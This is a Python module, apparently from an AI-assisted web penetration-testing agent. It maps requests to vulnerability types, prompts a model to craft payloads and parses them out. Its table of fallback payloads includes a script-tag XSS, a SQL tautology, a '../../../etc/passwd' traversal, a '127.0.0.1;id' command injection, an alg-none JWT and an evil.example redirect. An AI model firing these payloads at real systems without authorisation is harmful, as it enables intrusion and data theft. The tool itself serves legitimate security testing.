"""Skill mode — model crafts payload; agent locks path/target."""

import re

from terminator.core.memory import load_findings
from terminator.core.targets import extract_url

SKILL_TYPES = {
    "xss": {
        "keywords": ("xss", "cross-site", "cross site", "script tag"),
        "defaults": {"path": "/search", "param": "q"},
        "probe_tool": "probe_xss",
        "fallback_payload": "<script>alert(1)</script>",
        "instruction": "Craft an HTML/JS XSS payload.",
    },
    "sqli": {
        "keywords": ("sqli", "sql injection", "sqlinjection", "sql inject"),
        "defaults": {"path": "/user", "param": "id"},
        "probe_tool": "probe_sqli",
        "fallback_payload": "' OR '1'='1",
        "instruction": "Craft a SQL injection payload.",
    },
    "redirect": {
        "keywords": ("open redirect", "redirect check", "url redirect"),
        "defaults": {"path": "/redirect", "param": "url"},
        "probe_tool": "probe_redirect",
        "fallback_payload": "https://evil.example/phish",
        "instruction": "Craft an external URL for open redirect test.",
    },
    "traversal": {
        "keywords": ("path traversal", "directory traversal", "lfi", "../"),
        "defaults": {"path": "/files", "param": "name"},
        "probe_tool": "probe_traversal",
        "fallback_payload": "../../../etc/passwd",
        "instruction": "Craft a path traversal payload.",
    },
    "jwt": {
        "keywords": ("jwt", "auth bypass", "token bypass", "alg none", "algorithm none"),
        "defaults": {"path": "/api/admin", "param": "Authorization"},
        "probe_tool": "probe_jwt",
        "fallback_payload": "",
        "instruction": "Craft a JWT token (e.g. alg:none with admin role) or leave payload empty for auto none-token.",
    },
    "idor": {
        "keywords": ("idor", "insecure direct", "object reference"),
        "defaults": {"path": "/user", "param": "id"},
        "probe_tool": "probe_idor",
        "fallback_payload": "2",
        "instruction": "Craft an object ID to access another user's data.",
    },
    "mass_assignment": {
        "keywords": ("mass assignment", "parameter tamper", "role injection"),
        "defaults": {"path": "/api/login", "param": "body"},
        "probe_tool": "probe_mass_assignment",
        "fallback_payload": '{"username":"demo","password":"demo","role":"admin"}',
        "instruction": "Craft JSON body with extra privileged fields for login.",
    },
    "cors": {
        "keywords": ("cors", "cross-origin", "access-control"),
        "defaults": {"path": "/api/cors", "param": "Origin"},
        "probe_tool": "probe_cors",
        "fallback_payload": "https://evil.example",
        "instruction": "Craft an evil Origin header value.",
    },
    "ssrf": {
        "keywords": ("ssrf", "server-side request", "fetch url"),
        "defaults": {"path": "/fetch", "param": "url"},
        "probe_tool": "probe_ssrf",
        "fallback_payload": "http://127.0.0.1:11434/",
        "instruction": "Craft an internal URL for the server to fetch.",
    },
    "cmdi": {
        "keywords": ("command injection", "cmd injection", "cmdi", "os injection", "shell inject"),
        "defaults": {"path": "/ping", "param": "host"},
        "probe_tool": "probe_cmdi",
        "fallback_payload": "127.0.0.1;id",
        "instruction": "Craft a command injection payload with shell metacharacters.",
    },
    "ssti": {
        "keywords": ("ssti", "template injection", "server-side template"),
        "defaults": {"path": "/render", "param": "template"},
        "probe_tool": "probe_ssti",
        "fallback_payload": "{{7*7}}",
        "instruction": "Craft a template expression payload.",
    },
    "crlf": {
        "keywords": ("crlf", "header injection", "response splitting"),
        "defaults": {"path": "/echo", "param": "msg"},
        "probe_tool": "probe_crlf",
        "fallback_payload": "a%0d%0AX-Injected: evil",
        "instruction": "Craft a CRLF/header injection payload.",
    },
}

PATH_MAP = {
    "/search": "q",
    "/user": "id",
    "/redirect": "url",
    "/files": "name",
    "/fetch": "url",
    "/ping": "host",
    "/render": "template",
    "/echo": "msg",
    "/api/cors": "Origin",
    "/api/admin": "Authorization",
    "/api/login": "body",
}


def detect_skill_type(text: str) -> str:
    lower = text.lower()
    order = ("mass assignment", "path traversal", "command injection", "open redirect",
             "sql injection", "template injection", "auth bypass", "jwt")
    for phrase in order:
        for name, cfg in SKILL_TYPES.items():
            if phrase in lower and phrase in " ".join(cfg["keywords"]):
                return name
    for name, cfg in SKILL_TYPES.items():
        if any(k in lower for k in cfg["keywords"]):
            return name
    return "xss"


def wants_skill_mode(text: str) -> bool:
    lower = text.lower().strip()
    if lower in {"/skills", "skills", "list skills"}:
        return False
    craft_hints = (
        "craft", "try payload", "test with", "probe with", "inject",
        "use payload", "custom payload", "run skill",
    )
    if any(h in lower for h in craft_hints):
        return True
    for cfg in SKILL_TYPES.values():
        if any(k in lower for k in cfg["keywords"]) and any(
            w in lower for w in ("craft", "try", "test", "payload", "inject", "probe")
        ):
            return True
    if re.search(r"<[^>]+>", text):
        return True
    if re.search(r"'\s*OR\s*", text, flags=re.I):
        return True
    if "../" in text or "{{" in text:
        return True
    return False


def wants_probe_followup(text: str) -> bool:
    lower = text.lower().strip()
    hints = (
        "is it vulnerable", "was it vulnerable", "is that vulnerable",
        "did it work", "what was the result", "vulnerable?",
    )
    return any(h in lower for h in hints)


def parse_skill_hints(text: str, skill: str) -> dict:
    cfg = SKILL_TYPES.get(skill, SKILL_TYPES["xss"])
    hints = {"target": extract_url(text), **cfg["defaults"], "skill": skill}
    lower = text.lower()
    for path, param in PATH_MAP.items():
        if path in lower:
            hints["path"] = path
            hints["param"] = param
    match = re.search(r"(/[\w./-]+)", text)
    if match and hints["path"] in ("", "/search"):
        hints["path"] = match.group(1).split("?", 1)[0]
    return hints


def build_skill_prompt(text: str, skill: str | None = None) -> str:
    skill = skill or detect_skill_type(text)
    cfg = SKILL_TYPES[skill]
    hints = parse_skill_hints(text, skill)
    return (
        f"You test {skill} on localhost using {cfg['probe_tool']} ONLY. "
        f"Use exactly: target={hints['target']}, path={hints['path']}, param={hints['param']}. "
        f"{cfg['instruction']} "
        f"Call {cfg['probe_tool']} once, then answer in 1-2 plain sentences."
    )


def extract_payload(text: str, skill: str = "xss") -> str:
    if not text:
        return SKILL_TYPES.get(skill, SKILL_TYPES["xss"])["fallback_payload"]
    cfg = SKILL_TYPES.get(skill, SKILL_TYPES["xss"])

    if skill == "jwt":
        match = re.search(r"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)", text)
        if match:
            return match.group(1)
        return cfg["fallback_payload"]

    if skill == "mass_assignment":
        match = re.search(r"(\{[^{}]+\})", text)
        if match:
            return match.group(1)

    if skill == "xss":
        for pattern in (r"(<script[^>]*>.*?</script>)", r"(<[^>]*on\w+[^>]*>)"):
            match = re.search(pattern, text, flags=re.I | re.S)
            if match:
                return match.group(1)

    if skill in {"sqli", "traversal", "crlf"}:
        match = re.search(r"(\.{2,}/[\w./-]+)", text)
        if match:
            return match.group(1)
        match = re.search(r"(['\"].*?(?:OR|--|UNION).+?['\"])", text, flags=re.I)
        if match:
            return match.group(1).strip("'\"")

    if skill in {"redirect", "cors", "ssrf"}:
        match = re.search(r"(https?://[^\s'\"<>]+)", text, flags=re.I)
        if match:
            return match.group(1)

    if skill == "cmdi":
        match = re.search(r"([\w.]+[;&|`][\w]+)", text)
        if match:
            return match.group(1)

    if skill == "ssti":
        match = re.search(r"(\{\{[^}]+\}\})", text)
        if match:
            return match.group(1)

    match = re.search(r"payload[:\s]+([^\n]+)", text, flags=re.I)
    if match:
        return match.group(1).strip().strip('"').strip("'")
    return cfg["fallback_payload"]


def answer_probe_followup() -> str:
    data = load_findings()
    probe = data.get("last_probe")
    if probe:
        skill = probe.get("skill", "probe")
        path = probe.get("path", "?")
        param = probe.get("param", "?")
        payload = probe.get("payload", "?")
        contexts = ", ".join(probe.get("contexts") or probe.get("signals") or []) or "none"
        if probe.get("vulnerable"):
            return f"Yes - {skill} vulnerable on {path} ({param}).\n  payload: {payload}\n  signals: {contexts}"
        return f"No - {skill} not vulnerable.\n  last payload: {payload}"
    return "No probe data yet. Try: craft sqli payload and test /user on http://127.0.0.1:3000"
